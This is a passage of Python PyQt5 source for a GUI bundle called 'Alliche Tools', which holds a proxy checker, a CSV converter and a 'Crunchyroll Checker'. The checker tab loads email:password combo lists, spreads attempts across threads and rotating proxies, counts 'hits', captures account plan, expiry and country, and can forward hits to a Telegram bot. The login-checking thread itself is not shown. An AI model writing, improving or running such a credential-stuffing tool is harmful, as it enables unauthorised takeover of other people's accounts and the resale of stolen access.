        save_btn = QPushButton("Convert & Save to TXT...")
        save_btn.clicked.connect(self.convert_and_save)
        btn_layout.addWidget(save_btn)
        layout.addLayout(btn_layout)

        layout.addStretch()
        self.setLayout(layout)

    def browse_csv(self):
        fname, _ = QFileDialog.getOpenFileName(self, "Select CSV File", "", "CSV Files (*.csv);;All Files (*.*)")
        if fname:
            self.csv_path.setText(fname)
            self.refresh_preview()

    def get_delimiter(self):
        delim_map = {
            "Comma (,)": ",",
            "Semicolon (;)": ";",
            "Tab": "\t",
            "Pipe (|)": "|"
        }
        return delim_map[self.delimiter_combo.currentText()]

    def parse_pipe_fields(self, text):
        if not text or not self.parse_pipe.isChecked():
            return text
        parts = text.split('|')
        result = []
        for part in parts:
            if '=' in part:
                key, val = part.split('=', 1)
                key = key.strip()
                val = val.strip()
                if key.lower() in ('plan', 'expairy', 'expiry', 'days', 'price', 'billing', 'auto_renew', 'parental_pin', 'mobile_no', 'country', 'concurrent_stream'):
                    result.append(f"{key.capitalize()}: {val}")
                else:
                    result.append(f"{key}: {val}")
            else:
                result.append(part)
        return ' | '.join(result)

    def process_row(self, row, headers):
        if not self.parse_pipe.isChecked():
            return row
        new_row = []
        for i, cell in enumerate(row):
            if '|' in cell and '=' in cell:
                new_row.append(self.parse_pipe_fields(cell))
            else:
                new_row.append(cell)
        return new_row

    def convert_csv_to_text(self, filepath, delimiter, include_header=True, output_format="aligned"):
        rows = []
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                reader = csv.reader(f, delimiter=delimiter)
                for row in reader:
                    rows.append(row)
        except Exception as e:
            return None, f"Error reading CSV: {str(e)}"

        if not rows:
            return None, "CSV file is empty."

        raw_headers = rows[0] if include_header else None
        data_rows = rows[1:] if include_header else rows
        processed_rows = [self.process_row(row, raw_headers) for row in data_rows]

        if output_format == "aligned":
            all_rows = []
            if raw_headers:
                all_rows.append(raw_headers)
            all_rows.extend(processed_rows)
            if not all_rows:
                return "", None
            col_widths = [max(len(str(cell)) for cell in col) for col in zip(*all_rows)]
            lines = []
            if raw_headers:
                lines.append(" | ".join(str(cell).ljust(col_widths[i]) for i, cell in enumerate(raw_headers)))
                lines.append("-+-".join("-" * col_widths[i] for i in range(len(col_widths))))
            for row in processed_rows:
                lines.append(" | ".join(str(cell).ljust(col_widths[i]) for i, cell in enumerate(row)))
            return "\n".join(lines), None

        elif output_format == "markdown":
            lines = []
            if raw_headers:
                lines.append("| " + " | ".join(str(cell) for cell in raw_headers) + " |")
                lines.append("|" + "|".join("---" for _ in raw_headers) + "|")
            for row in processed_rows:
                lines.append("| " + " | ".join(str(cell) for cell in row) + " |")
            return "\n".join(lines), None

        else:
            lines = []
            if raw_headers:
                lines.append(delimiter.join(str(cell) for cell in raw_headers))
            for row in processed_rows:
                lines.append(delimiter.join(str(cell) for cell in row))
            return "\n".join(lines), None

    def refresh_preview(self):
        if not self.csv_path.text():
            return
        delimiter = self.get_delimiter()
        include = self.include_header.isChecked()
        fmt = self.format_combo.currentText().lower()
        fmt_key = "aligned" if "aligned" in fmt else "markdown" if "markdown" in fmt else "plain"
        text, error = self.convert_csv_to_text(self.csv_path.text(), delimiter, include, fmt_key)
        if error:
            self.preview_text.setPlainText(f"Error: {error}")
        else:
            lines = text.split('\n')
            preview_lines = lines[:20]
            if len(lines) > 20:
                preview_lines.append("... (truncated)")
            self.preview_text.setPlainText("\n".join(preview_lines))

    def convert_and_save(self):
        if not self.csv_path.text():
            QMessageBox.warning(self, "No File", "Please select a CSV file first.")
            return
        delimiter = self.get_delimiter()
        include = self.include_header.isChecked()
        fmt = self.format_combo.currentText().lower()
        fmt_key = "aligned" if "aligned" in fmt else "markdown" if "markdown" in fmt else "plain"
        text, error = self.convert_csv_to_text(self.csv_path.text(), delimiter, include, fmt_key)
        if error:
            QMessageBox.critical(self, "Conversion Error", error)
            return
        save_path, _ = QFileDialog.getSaveFileName(self, "Save Text File", "", "Text Files (*.txt);;All Files (*.*)")
        if save_path:
            try:
                with open(save_path, 'w', encoding='utf-8') as f:
                    f.write(text)
                QMessageBox.information(self, "Success", f"File saved to:\n{save_path}")
            except Exception as e:
                QMessageBox.critical(self, "Save Error", f"Could not save file:\n{str(e)}")

# ---------- Main Window ----------
class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Alliche Tools – Proxy, Crunchyroll Checker + CSV Converter")
        self.setGeometry(100, 100, 1400, 950)
        self.setMinimumSize(1200, 800)
        self.setStyleSheet(self.get_stylesheet())

        self.music_player = None
        self.music_file = None
        self.music_playing = False
        self.loop_music = True
        if MUSIC_AVAILABLE:
            self.music_player = QMediaPlayer()
            self.music_player.mediaStatusChanged.connect(self.on_media_status_changed)
        else:
            QMessageBox.warning(self, "Music Unavailable",
                "QtMultimedia module not found. Music playback disabled.\n"
                "Install PyQt5 with multimedia support.")

        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)
        main_layout.setSpacing(5)
        main_layout.setContentsMargins(8, 8, 8, 8)

        header = QLabel("🔹 ALLICHE TOOLS – PROXY & CRUNCHYROLL CHECKER + CSV CONVERTER")
        header.setAlignment(Qt.AlignCenter)
        header.setStyleSheet("""
            QLabel {
                color: #F99F1B;
                font-size: 18px;
                font-weight: bold;
                padding: 6px;
                background-color: #1D2B3F;
                border-radius: 6px;
                border: 2px solid #F99F1B;
                font-family: 'Arial', sans-serif;
                margin-bottom: 2px;
            }
        """)
        if SHADOW_AVAILABLE:
            shadow = QGraphicsDropShadowEffect()
            shadow.setBlurRadius(10)
            shadow.setOffset(2, 2)
            shadow.setColor(QColor(0, 0, 0, 160))
            header.setGraphicsEffect(shadow)
        main_layout.addWidget(header)

        self._add_music_controls(main_layout)

        self.tabs = QTabWidget()
        main_layout.addWidget(self.tabs)

        self.proxy_tab = QWidget()
        self.tabs.addTab(self.proxy_tab, "🔌 Proxy Checker")
        self._setup_proxy_tab()

        self.crunchyroll_tab = QWidget()
        self.tabs.addTab(self.crunchyroll_tab, "🍣 Crunchyroll Checker")
        self._setup_crunchyroll_tab()

        self.csv_converter_tab = CsvToTxtConverter()
        self.tabs.addTab(self.csv_converter_tab, "📄 CSV to TXT")

        self.logs_tab = QWidget()
        self.tabs.addTab(self.logs_tab, "📝 Logs")
        self._setup_logs_tab()

        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_label = QLabel("🟢 READY")
        self.status_label.setStyleSheet("color: #2ECC71; font-weight: bold; font-size: 11px;")
        self.status_bar.addWidget(self.status_label)
        self.timer_label = QLabel("⏱️ Time: 00:00:00")
        self.timer_label.setStyleSheet("color: #F99F1B; font-weight: bold; font-size: 11px;")
        self.status_bar.addPermanentWidget(self.timer_label)
        self.speed_label = QLabel("⚡ CPM: 0")
        self.speed_label.setStyleSheet("color: #FFFFFF; font-weight: bold; font-size: 11px;")
        self.status_bar.addPermanentWidget(self.speed_label)
        self.workers_label = QLabel("👷 Bots: 0")
        self.workers_label.setStyleSheet("color: #3498DB; font-weight: bold; font-size: 11px;")
        self.status_bar.addPermanentWidget(self.workers_label)

        self.update_timer = QTimer()
        self.update_timer.timeout.connect(self.update_display)
        self.update_timer.start(500)
        self.elapsed_timer = QTimer()
        self.elapsed_timer.timeout.connect(self.update_timer_display)
        self.elapsed_timer.start(1000)

        self.proxy_thread = None
        self.crunchyroll_thread = None
        self.current_checker_start_time = None
        self.log_queue = Queue()

        self._load_default_music()
        self.show_creator_message()

    def get_stylesheet(self):
        return """
        QMainWindow { background-color: #0F1A2F; }
        QWidget { background-color: transparent; color: #E0E0E0; font-family: 'Segoe UI', Arial; font-size: 11px; }
        QLabel { color: #E0E0E0; font-size: 11px; }
        QPushButton {
            background-color: #1D2B3F; border: 1px solid #F99F1B; border-radius: 4px;
            padding: 4px 8px; color: white; font-weight: bold; font-size: 11px; min-height: 24px;
        }
        QPushButton:hover { background-color: #2C3E5A; border-color: #FFB347; }
        QPushButton:pressed { background-color: #0F1A2F; }
        QPushButton:disabled { background-color: #2A2A2A; border-color: #555555; color: #888888; }
        QPushButton#startBtn { background-color: #2ECC71; border-color: #27AE60; color: white; font-size: 12px; }
        QPushButton#stopBtn { background-color: #E74C3C; border-color: #C0392B; color: white; font-size: 12px; }
        QPushButton#exportBtn { background-color: #3498DB; border-color: #2980B9; color: white; }
        QPushButton#musicBtn { background-color: #9B59B6; border-color: #8E44AD; color: white; }
        QTextEdit, QPlainTextEdit {
            background-color: #1D2B3F; border: 1px solid #3498DB; border-radius: 4px;
            padding: 4px; color: #FFFFFF; font-family: 'Consolas', monospace; font-size: 11px;
        }
        QGroupBox {
            border: 1px solid #3498DB; border-radius: 6px; margin-top: 6px; padding-top: 10px;
            color: #F99F1B; font-weight: bold; font-size: 11px; background-color: rgba(0,0,0,0.2);
        }
        QGroupBox::title { subcontrol-origin: margin; subcontrol-position: top left; padding: 0 5px; background-color: #0F1A2F; }
        QProgressBar {
            border: 1px solid #3498DB; border-radius: 4px; text-align: center; color: white;
            font-weight: bold; font-size: 10px; height: 18px; background-color: #1D2B3F;
        }
        QProgressBar::chunk { background-color: #3498DB; border-radius: 4px; }
        QTabWidget::pane { border: 1px solid #3498DB; border-radius: 6px; background-color: #0F1A2F; }
        QTabBar::tab {
            background-color: #1D2B3F; border: 1px solid #3498DB; border-bottom: none;
            border-top-left-radius: 4px; border-top-right-radius: 4px; padding: 5px 10px;
            color: #E0E0E0; font-size: 11px; font-weight: bold; margin-right: 2px;
        }
        QTabBar::tab:selected { background-color: #2C3E5A; color: #F99F1B; }
        QTableWidget {
            background-color: #1D2B3F; border: 1px solid #3498DB; border-radius: 4px;
            color: #FFFFFF; font-size: 10px; gridline-color: #2C3E5A;
        }
        QTableWidget::item { padding: 3px; border-bottom: 1px solid #2C3E5A; }
        QHeaderView::section {
            background-color: #2C3E5A; color: #F99F1B; padding: 4px;
            border: 1px solid #3498DB; font-weight: bold; font-size: 10px;
        }
        QStatusBar { background-color: #1D2B3F; color: #F99F1B; font-size: 11px; font-weight: bold; padding: 4px; border-top: 1px solid #3498DB; }
        QSpinBox, QComboBox, QLineEdit {
            background-color: #1D2B3F; border: 1px solid #3498DB; border-radius: 4px;
            padding: 2px; color: #FFFFFF; min-width: 50px; font-size: 10px;
        }
        QComboBox::drop-down { border: none; }
        QComboBox QAbstractItemView { background-color: #1D2B3F; border: 1px solid #3498DB; color: #FFFFFF; selection-background-color: #3498DB; }
        QSlider::groove:horizontal { height: 4px; background: #1D2B3F; border: 1px solid #3498DB; border-radius: 2px; }
        QSlider::handle:horizontal { background: #F99F1B; border: 1px solid #F99F1B; width: 10px; margin: -4px 0; border-radius: 5px; }
        QSlider::handle:horizontal:hover { background: #FFB347; }
        """

    def _add_music_controls(self, layout):
        music_group = QGroupBox("🎵 MUSIC PLAYER")
        music_layout = QHBoxLayout()
        music_layout.setSpacing(8)

        self.play_btn = QPushButton("▶")
        self.play_btn.setToolTip("Play")
        self.play_btn.setFixedWidth(40)
        self.play_btn.setEnabled(False)
        self.play_btn.clicked.connect(self.play_music)
        music_layout.addWidget(self.play_btn)

        self.pause_btn = QPushButton("⏸")
        self.pause_btn.setToolTip("Pause")
        self.pause_btn.setFixedWidth(40)
        self.pause_btn.setEnabled(False)
        self.pause_btn.clicked.connect(self.pause_music)
        music_layout.addWidget(self.pause_btn)

        self.stop_btn = QPushButton("⏹")
        self.stop_btn.setToolTip("Stop")
        self.stop_btn.setFixedWidth(40)
        self.stop_btn.setEnabled(False)
        self.stop_btn.clicked.connect(self.stop_music)
        music_layout.addWidget(self.stop_btn)

        self.loop_checkbox = QCheckBox("Loop")
        self.loop_checkbox.setChecked(True)
        self.loop_checkbox.stateChanged.connect(self.toggle_loop)
        music_layout.addWidget(self.loop_checkbox)

        music_layout.addWidget(QLabel("Volume:"))
        self.volume_slider = QSlider(Qt.Horizontal)
        self.volume_slider.setRange(0, 100)
        self.volume_slider.setValue(50)
        self.volume_slider.setFixedWidth(100)
        self.volume_slider.valueChanged.connect(self.set_music_volume)
        music_layout.addWidget(self.volume_slider)

        music_layout.addStretch()
        music_group.setLayout(music_layout)
        layout.addWidget(music_group)

        if not MUSIC_AVAILABLE or self.music_player is None:
            self.play_btn.setEnabled(False)
            self.pause_btn.setEnabled(False)
            self.stop_btn.setEnabled(False)
            self.loop_checkbox.setEnabled(False)
            self.volume_slider.setEnabled(False)
            music_group.setTitle("🎵 MUSIC PLAYER (disabled)")

    def _load_default_music(self):
        if MUSIC_AVAILABLE and self.music_player:
            default_path = get_path("default.mp3")
            if os.path.exists(default_path):
                self.music_file = default_path
                self.music_player.setMedia(QMediaContent(QUrl.fromLocalFile(default_path)))
                self.play_btn.setEnabled(True)
                self.stop_btn.setEnabled(True)
                self.pause_btn.setEnabled(True)
                self.log("✅ Default music loaded: default.mp3")
            else:
                self.log("ℹ️ No default.mp3 found. Music controls disabled.")
        else:
            self.log("ℹ️ Music unavailable.")

    def play_music(self):
        if self.music_player and self.music_file:
            self.music_player.play()
            self.music_playing = True
            self.play_btn.setEnabled(False)
            self.pause_btn.setEnabled(True)
            self.stop_btn.setEnabled(True)
            self.log("🎵 Music playing")

    def pause_music(self):
        if self.music_player and self.music_playing:
            self.music_player.pause()
            self.music_playing = False
            self.play_btn.setEnabled(True)
            self.pause_btn.setEnabled(False)
            self.stop_btn.setEnabled(True)
            self.log("🎵 Music paused")

    def stop_music(self):
        if self.music_player:
            self.music_player.stop()
            self.music_playing = False
            self.play_btn.setEnabled(True)
            self.pause_btn.setEnabled(False)
            self.stop_btn.setEnabled(False)
            self.log("🎵 Music stopped")

    def set_music_volume(self, value):
        if self.music_player:
            self.music_player.setVolume(value)

    def toggle_loop(self, state):
        self.loop_music = (state == Qt.Checked)

    def on_media_status_changed(self, status):
        if status == QMediaPlayer.EndOfMedia and self.loop_music:
            self.music_player.play()

    def log(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_output.appendPlainText(f"[{timestamp}] {message}")
        scrollbar = self.log_output.verticalScrollBar()
        scrollbar.setValue(scrollbar.maximum())

    def _setup_proxy_tab(self):
        layout = QVBoxLayout(self.proxy_tab)
        layout.setSpacing(4)

        input_group = QGroupBox("PROXY INPUT")
        input_layout = QVBoxLayout()
        self.proxy_text = QPlainTextEdit()
        self.proxy_text.setPlaceholderText("Enter proxies (one per line, format: ip:port or ip:port:user:pass)")
        self.proxy_text.setMinimumHeight(100)
        input_layout.addWidget(self.proxy_text)
        file_buttons = QHBoxLayout()
        load_proxy_btn = QPushButton("📁 Load Proxies")
        load_proxy_btn.clicked.connect(self.load_proxy_file)
        file_buttons.addWidget(load_proxy_btn)
        clear_proxy_btn = QPushButton("🗑️ Clear")
        clear_proxy_btn.clicked.connect(lambda: self.proxy_text.clear())
        file_buttons.addWidget(clear_proxy_btn)
        input_layout.addLayout(file_buttons)
        input_group.setLayout(input_layout)
        layout.addWidget(input_group)

        settings_group = QGroupBox("SETTINGS")
        settings_layout = QGridLayout()
        settings_layout.addWidget(QLabel("Threads:"), 0, 0)
        self.proxy_threads_spin = QSpinBox()
        self.proxy_threads_spin.setRange(1, 50)
        self.proxy_threads_spin.setValue(10)
        settings_layout.addWidget(self.proxy_threads_spin, 0, 1)
        settings_layout.addWidget(QLabel("Retries:"), 1, 0)
        self.proxy_retries_spin = QSpinBox()
        self.proxy_retries_spin.setRange(1, 3)
        self.proxy_retries_spin.setValue(2)
        settings_layout.addWidget(self.proxy_retries_spin, 1, 1)
        settings_layout.addWidget(QLabel("Max Rows:"), 2, 0)
        self.proxy_max_rows_spin = QSpinBox()
        self.proxy_max_rows_spin.setRange(100, 5000)
        self.proxy_max_rows_spin.setValue(2000)
        self.proxy_max_rows_spin.setSingleStep(500)
        settings_layout.addWidget(self.proxy_max_rows_spin, 2, 1)
        settings_group.setLayout(settings_layout)
        layout.addWidget(settings_group)

        control_layout = QHBoxLayout()
        self.proxy_start_btn = QPushButton("▶ START CHECK")
        self.proxy_start_btn.setObjectName("startBtn")
        self.proxy_start_btn.clicked.connect(self.start_proxy_check)
        control_layout.addWidget(self.proxy_start_btn)
        self.proxy_stop_btn = QPushButton("⏹ STOP")
        self.proxy_stop_btn.setObjectName("stopBtn")
        self.proxy_stop_btn.clicked.connect(self.stop_proxy_check)
        self.proxy_stop_btn.setEnabled(False)
        control_layout.addWidget(self.proxy_stop_btn)
        self.proxy_clear_btn = QPushButton("🗑️ Clear Results")
        self.proxy_clear_btn.clicked.connect(self.clear_proxy_results)
        control_layout.addWidget(self.proxy_clear_btn)
        self.proxy_copy_btn = QPushButton("📋 Copy Working")
        self.proxy_copy_btn.clicked.connect(self.copy_working_proxies)
        control_layout.addWidget(self.proxy_copy_btn)
        self.proxy_save_btn = QPushButton("💾 Save Working")
        self.proxy_save_btn.clicked.connect(self.save_working_proxies)
        control_layout.addWidget(self.proxy_save_btn)
        layout.addLayout(control_layout)

        self.proxy_progress = QProgressBar()
        layout.addWidget(self.proxy_progress)
        self.proxy_stats = QLabel("Total: 0 | Working: 0 | Failed: 0")
        self.proxy_stats.setStyleSheet("color: #F99F1B; font-weight: bold; font-size: 11px;")
        layout.addWidget(self.proxy_stats)

        self.proxy_table = QTableWidget()
        self.proxy_table.setColumnCount(9)
        self.proxy_table.setHorizontalHeaderLabels(['Proxy', 'IP', 'Country', 'City', 'Time (ms)', 'Anonymity', 'HTTP', 'HTTPS', 'Status'])
        self.proxy_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self.proxy_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeToContents)
        self.proxy_table.setSortingEnabled(True)
        layout.addWidget(self.proxy_table)

        self.proxy_results = []
        self.proxy_total = 0
        self.proxy_working = 0

    def _setup_crunchyroll_tab(self):
        layout = QVBoxLayout(self.crunchyroll_tab)
        layout.setSpacing(4)

        acc_group = QGroupBox("ACCOUNTS (email:password)")
        acc_layout = QVBoxLayout()
        self.crunchyroll_accounts_text = QPlainTextEdit()
        self.crunchyroll_accounts_text.setPlaceholderText("Enter email:password combos (one per line)")
        self.crunchyroll_accounts_text.setMinimumHeight(80)
        acc_layout.addWidget(self.crunchyroll_accounts_text)
        acc_buttons = QHBoxLayout()
        load_acc_btn = QPushButton("📁 Load Accounts")
        load_acc_btn.clicked.connect(self.load_crunchyroll_accounts_file)
        acc_buttons.addWidget(load_acc_btn)
        clear_acc_btn = QPushButton("🗑️ Clear")
        clear_acc_btn.clicked.connect(lambda: self.crunchyroll_accounts_text.clear())
        acc_buttons.addWidget(clear_acc_btn)
        acc_layout.addLayout(acc_buttons)
        acc_group.setLayout(acc_layout)
        layout.addWidget(acc_group)

        proxy_group = QGroupBox("PROXIES (optional)")
        proxy_layout = QVBoxLayout()
        self.crunchyroll_proxy_text = QPlainTextEdit()
        self.crunchyroll_proxy_text.setPlaceholderText("Enter proxies (one per line, format: ip:port or ip:port:user:pass)")
        self.crunchyroll_proxy_text.setMinimumHeight(60)
        proxy_layout.addWidget(self.crunchyroll_proxy_text)
        proxy_buttons = QHBoxLayout()
        load_proxy_btn = QPushButton("📁 Load Proxies")
        load_proxy_btn.clicked.connect(self.load_crunchyroll_proxies_file)
        proxy_buttons.addWidget(load_proxy_btn)
        clear_proxy_btn = QPushButton("🗑️ Clear")
        clear_proxy_btn.clicked.connect(lambda: self.crunchyroll_proxy_text.clear())
        proxy_buttons.addWidget(clear_proxy_btn)
        proxy_layout.addLayout(proxy_buttons)
        proxy_group.setLayout(proxy_layout)
        layout.addWidget(proxy_group)

        tg_group = QGroupBox("TELEGRAM NOTIFICATION")
        tg_layout = QHBoxLayout()
        self.crunchyroll_tg_checkbox = QCheckBox("Send hits")
        tg_layout.addWidget(self.crunchyroll_tg_checkbox)
        tg_layout.addWidget(QLabel("Token:"))
        self.crunchyroll_tg_token = QLineEdit()
        self.crunchyroll_tg_token.setPlaceholderText("123456:ABC-DEF...")
        tg_layout.addWidget(self.crunchyroll_tg_token)
        tg_layout.addWidget(QLabel("Chat ID:"))
        self.crunchyroll_tg_chat_id = QLineEdit()
        self.crunchyroll_tg_chat_id.setPlaceholderText("-100...")
        tg_layout.addWidget(self.crunchyroll_tg_chat_id)
        self.crunchyroll_tg_test_btn = QPushButton("Test")
        self.crunchyroll_tg_test_btn.clicked.connect(self.test_crunchyroll_telegram)
        tg_layout.addWidget(self.crunchyroll_tg_test_btn)
        tg_group.setLayout(tg_layout)
        layout.addWidget(tg_group)

        settings_group = QGroupBox("SETTINGS")
        settings_layout = QGridLayout()
        settings_layout.addWidget(QLabel("Threads:"), 0, 0)
        self.crunchyroll_threads_spin = QSpinBox()
        self.crunchyroll_threads_spin.setRange(1, 50)
        self.crunchyroll_threads_spin.setValue(15)
        settings_layout.addWidget(self.crunchyroll_threads_spin, 0, 1)
        settings_layout.addWidget(QLabel("Retries:"), 1, 0)
        self.crunchyroll_retries_spin = QSpinBox()
        self.crunchyroll_retries_spin.setRange(1, 3)
        self.crunchyroll_retries_spin.setValue(2)
        settings_layout.addWidget(self.crunchyroll_retries_spin, 1, 1)
        settings_layout.addWidget(QLabel("Max Rows:"), 2, 0)
        self.crunchyroll_max_rows_spin = QSpinBox()
        self.crunchyroll_max_rows_spin.setRange(100, 5000)
        self.crunchyroll_max_rows_spin.setValue(2000)
        self.crunchyroll_max_rows_spin.setSingleStep(500)
        settings_layout.addWidget(self.crunchyroll_max_rows_spin, 2, 1)
        settings_layout.addWidget(QLabel("Delay (ms):"), 3, 0)
        self.crunchyroll_delay_spin = QSpinBox()
        self.crunchyroll_delay_spin.setRange(0, 30000)
        self.crunchyroll_delay_spin.setValue(2000)
        self.crunchyroll_delay_spin.setSingleStep(500)
        settings_layout.addWidget(self.crunchyroll_delay_spin, 3, 1)
        settings_group.setLayout(settings_layout)
        layout.addWidget(settings_group)

        control_layout = QHBoxLayout()
        self.crunchyroll_start_btn = QPushButton("▶ START CHECK")
        self.crunchyroll_start_btn.setObjectName("startBtn")
        self.crunchyroll_start_btn.clicked.connect(self.start_crunchyroll_check)
        control_layout.addWidget(self.crunchyroll_start_btn)
        self.crunchyroll_stop_btn = QPushButton("⏹ STOP")
        self.crunchyroll_stop_btn.setObjectName("stopBtn")
        self.crunchyroll_stop_btn.clicked.connect(self.stop_crunchyroll_check)
        self.crunchyroll_stop_btn.setEnabled(False)
        control_layout.addWidget(self.crunchyroll_stop_btn)
        self.crunchyroll_clear_btn = QPushButton("🗑️ Clear Results")
        self.crunchyroll_clear_btn.clicked.connect(self.clear_crunchyroll_results)
        control_layout.addWidget(self.crunchyroll_clear_btn)
        self.crunchyroll_export_btn = QPushButton("💾 Export Hits")
        self.crunchyroll_export_btn.setObjectName("exportBtn")
        self.crunchyroll_export_btn.clicked.connect(self.export_crunchyroll_hits)
        control_layout.addWidget(self.crunchyroll_export_btn)
        layout.addLayout(control_layout)

        self.crunchyroll_progress = QProgressBar()
        layout.addWidget(self.crunchyroll_progress)
        self.crunchyroll_stats = QLabel("Total: 0 | Hits: 0 | Bad: 0")
        self.crunchyroll_stats.setStyleSheet("color: #F99F1B; font-weight: bold; font-size: 11px;")
        layout.addWidget(self.crunchyroll_stats)

        self.crunchyroll_table = QTableWidget()
        self.crunchyroll_table.setColumnCount(11)
        self.crunchyroll_table.setHorizontalHeaderLabels([
            'Email', 'Status', 'Email Verified', 'Account Creation', 'Plan',
            'Subscribable', 'Free Trial', 'Expiry', 'Active', 'Country', 'Capture String'
        ])
        self.crunchyroll_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self.crunchyroll_table.setSortingEnabled(True)
        layout.addWidget(self.crunchyroll_table)

        self.crunchyroll_results = []
        self.crunchyroll_total = 0
        self.crunchyroll_hits = 0
        self.crunchyroll_bad = 0

    def _setup_logs_tab(self):
        layout = QVBoxLayout(self.logs_tab)
        self.log_output = QPlainTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setMaximumBlockCount(2000)
        self.log_output.setStyleSheet("background-color: #1D2B3F; color: #FFFFFF; font-family: 'Consolas'; font-size: 10px; border: 1px solid #3498DB; border-radius: 4px;")
        layout.addWidget(self.log_output)
        clear_log_btn = QPushButton("🗑️ Clear Logs")
        clear_log_btn.clicked.connect(self.log_output.clear)
        layout.addWidget(clear_log_btn)

    def show_creator_message(self):
        message = """
═══════════════════════════════════════════════════════════════════════════════════
                              👋 HI THERE!

I'm the creator of Alliche Tools.

This project is more than just software to me — it's a growing collection of tools 
built with patience, passion, and persistence. Each tool exists to solve real 
problems and make everyday digital work a little easier.

I continue building despite limited resources and ongoing health struggles that 
often make the journey harder than it looks. Some days are not easy, but I keep 
going because I believe in what I'm building and in the people who use these tools.

If Alliche Tools saves you time, lightens your workload, or supports you in any 
way, and you feel moved to support the project, you're welcome to do so voluntarily. 
Every contribution helps me continue improving, maintaining, and keeping these 
tools available.

💳 Binance ID: 801774085
📮 USDT (TRX): TBeHkEpdtDqzzyvtWgMgiR1bhS7LDpi19L

Thank you for your kindness, your trust, and for being part of this journey. 
It truly means more than words can express 🤍

Join our channel: @allichetools
Join our chat: @allichetoolsgroup
Need help? DM me: @alliche_bot or @allicheamine2
═══════════════════════════════════════════════════════════════════════════════════
"""
        for line in message.split('\n'):
            self.log(line.strip())

    def load_proxy_file(self):
        fname, _ = QFileDialog.getOpenFileName(self, "Open Proxy List", "", "Text Files (*.txt)")
        if fname:
            try:
                data = load_file_fast(fname)
                self.proxy_text.setPlainText(data)
                self.log(f"✅ Loaded proxies from {fname}")
            except Exception as e:
                self.log(f"❌ Error loading file: {e}")

    def load_crunchyroll_accounts_file(self):
        fname, _ = QFileDialog.getOpenFileName(self, "Open Accounts File", "", "Text Files (*.txt)")
        if fname:
            try:
                data = load_file_fast(fname)
                cleaned = self._clean_combo_text(data)
                self.crunchyroll_accounts_text.setPlainText(cleaned)
                self.log(f"✅ Loaded and cleaned accounts from {fname}")
            except Exception as e:
                self.log(f"❌ Error loading file: {e}")

    def load_crunchyroll_proxies_file(self):
        fname, _ = QFileDialog.getOpenFileName(self, "Open Proxies File", "", "Text Files (*.txt)")
        if fname:
            try:
                data = load_file_fast(fname)
                self.crunchyroll_proxy_text.setPlainText(data)
                self.log(f"✅ Loaded proxies from {fname}")
            except Exception as e:
                self.log(f"❌ Error loading file: {e}")

    def _clean_combo_text(self, text):
        lines = text.splitlines()
        valid_lines = []
        skipped = 0
        for line in lines:
            line = line.strip()
            if not line or line.startswith('#'):
                skipped += 1
                continue
            if ':' in line:
                user, pwd = line.split(':', 1)
                valid_lines.append(f"{user.strip()}:{pwd.strip()}")
            else:
                skipped += 1
        if skipped > 0:
            self.log(f"🧹 Auto‑cleaned: removed {skipped} invalid lines.")
        return '\n'.join(valid_lines)

    def test_crunchyroll_telegram(self):
        token = self.crunchyroll_tg_token.text().strip()
        chat_id = self.crunchyroll_tg_chat_id.text().strip()
        if not token or not chat_id:
            QMessageBox.warning(self, 'Telegram', 'Please enter bot token and chat ID.')
            return
        success = send_telegram(token, chat_id, "<b>✅ Test message from Crunchyroll Checker</b>\nSettings are working!")
        if success:
            QMessageBox.information(self, 'Telegram', 'Test message sent successfully!')
            self.log("✅ Telegram test message sent.")
        else:
            QMessageBox.critical(self, 'Telegram', 'Failed to send test message.')
            self.log("❌ Telegram test failed.")

    # ---------- Proxy Checking ----------
    def start_proxy_check(self):
        proxies = [l.strip() for l in self.proxy_text.toPlainText().splitlines() if l.strip() and not l.startswith('#')]
        if not proxies:
            QMessageBox.warning(self, "Warning", "No valid proxies.")
            return
        self.proxy_total = len(proxies)
        self.proxy_progress.setMaximum(self.proxy_total)
        self.proxy_progress.setValue(0)
        self.proxy_results.clear()
        self.proxy_table.setRowCount(0)
        self.proxy_working = 0
        self.proxy_stats.setText(f'Total: {self.proxy_total} | Working: 0 | Failed: 0')

        self.proxy_start_btn.setEnabled(False)
        self.proxy_stop_btn.setEnabled(True)
        self.proxy_text.setReadOnly(True)
        self.current_checker_start_time = time.time()
        self.status_label.setText("🟢 PROXY CHECK RUNNING")
        self.status_label.setStyleSheet("color: #2ECC71;")

        if self.music_player and self.music_file and not self.music_playing:
            self.play_music()

        self.proxy_thread = ProxyCheckerThread(proxies, self.proxy_threads_spin.value(), self.proxy_retries_spin.value())
        self.proxy_thread.progress.connect(self.update_proxy_progress)
        self.proxy_thread.result_ready.connect(self.add_proxy_result)
        self.proxy_thread.finished.connect(self.proxy_check_finished)
        self.proxy_thread.log_message.connect(self.log)
        self.proxy_thread.start()

    def stop_proxy_check(self):
        if self.proxy_thread and self.proxy_thread.isRunning():
            self.proxy_thread.stop()
            self.proxy_thread.wait()
            self.proxy_check_finished()

    def proxy_check_finished(self):
        self.proxy_start_btn.setEnabled(True)
        self.proxy_stop_btn.setEnabled(False)
        self.proxy_text.setReadOnly(False)
        self.status_label.setText("🟡 PROXY CHECK FINISHED")
        self.status_label.setStyleSheet("color: #F99F1B;")
        self.current_checker_start_time = None
        if self.proxy_progress.maximum() > 0:
            self.proxy_progress.setValue(self.proxy_progress.maximum())
        self.log("✅ Proxy check finished.")
        gc.collect()

    def update_proxy_progress(self, current, total):
        self.proxy_progress.setValue(current)

    def add_proxy_result(self, result):
        if result.get('working'):
            self.proxy_working += 1
        working = self.proxy_working
        failed = len(self.proxy_results) - working
        self.proxy_stats.setText(f'Total: {self.proxy_total} | Working: {working} | Failed: {failed}')

        row = self.proxy_table.rowCount()
        self.proxy_table.insertRow(row)
        self.proxy_table.setItem(row, 0, QTableWidgetItem(result['proxy']))
        self.proxy_table.setItem(row, 1, QTableWidgetItem(result.get('ip','')))
        self.proxy_table.setItem(row, 2, QTableWidgetItem(result.get('country','')))
        self.proxy_table.setItem(row, 3, QTableWidgetItem(result.get('city','')))
